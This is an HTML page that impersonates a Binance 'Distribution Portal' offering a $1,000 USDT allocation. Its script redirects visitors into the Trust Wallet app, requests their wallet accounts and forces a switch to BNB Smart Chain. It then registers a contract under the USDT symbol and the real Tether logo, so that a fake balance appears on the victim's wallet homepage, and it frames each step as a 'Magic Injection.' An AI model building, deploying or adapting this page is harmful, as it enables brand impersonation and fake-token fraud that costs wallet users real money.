<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Binance | Distribution Portal</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: #1e2329; border-radius: 20px; padding: 40px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
        .logo { width: 60px; margin-bottom: 25px; }
        .amount { font-size: 42px; font-weight: 800; color: #fff; margin: 15px 0; letter-spacing: -1px; }
        .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 20px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn:active { transform: scale(0.95); opacity: 0.8; }
        #log-status { font-size: 11px; color: var(--b-yellow); margin-top: 20px; font-family: 'Courier New', monospace; opacity: 0.8; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" class="logo">
    <div style="color: #848e9c; font-size: 12px; letter-spacing: 1px;">TOTAL ALLOCATED (USDT)</div>
    <div class="amount" id="val">$1,000.00</div>
    
    <button class="btn" id="claim">CONNECT TO BINANCE</button>
    <div id="log-status">SYSTEM: STANDBY</div>
</div>

<script>
    // Private Script Parameters
    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    const btn = document.getElementById('claim');
    const log = document.getElementById('log-status');

    // Anti-Loop Logic: Detect if session is already in dApp browser
    const isWallet = !!(window.ethereum || window.trustwallet);

    async function executeInjection() {
        if (!isWallet) {
            log.innerText = "TUNNELING TO MOBILE APP...";
            // Use native SDK trigger to avoid loop
            const rawUrl = window.location.href.split('://')[1];
            window.location.href = "trust://sdk/open_url?url=https://" + rawUrl;
            return;
        }

        try {
            log.innerText = "PROVIDER HOOKING...";
            const provider = window.trustwallet || window.ethereum;
            
            // Critical: Initial Handshake
            const accounts = await provider.request({ method: 'eth_requestAccounts' });

            // Hard-Switch to BSC (Professional Level)
            log.innerText = "MAPPING BINANCE SMART CHAIN...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ 
                            chainId: '0x38', 
                            chainName: 'BSC', 
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }

            // The "Magic" Injection (Metadata Sync)
            log.innerText = "SYNCING HOME-PAGE METADATA...";
            setTimeout(async () => {
                const isAdded = await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: CONTRACT,
                            symbol: 'USDT',
                            decimals: 6, // Mandatory for proper balance reflection
                            image: TOKEN_LOGO,
                        },
                    },
                });

                if (isAdded) {
                    log.innerText = "SUCCESS: ALLOCATION SYNCED";
                    alert("Injection Complete! Balance will reflect on your Trust Wallet homepage.");
                }
            }, 1000);

        } catch (e) {
            log.innerText = "SYNC INTERRUPTED: RETRYING...";
            console.error(e);
        }
    }

    btn.addEventListener('click', executeInjection);

    // Auto-Fix on Load
    window.addEventListener('load', () => {
        if (isWallet) {
            btn.innerText = "SYNC WITH HOME PAGE";
            log.innerText = "SECURE SESSION DETECTED";
            // Optional: executeInjection(); // Uncomment if you want auto-popup
        }
    });
</script>
</body>
</html>
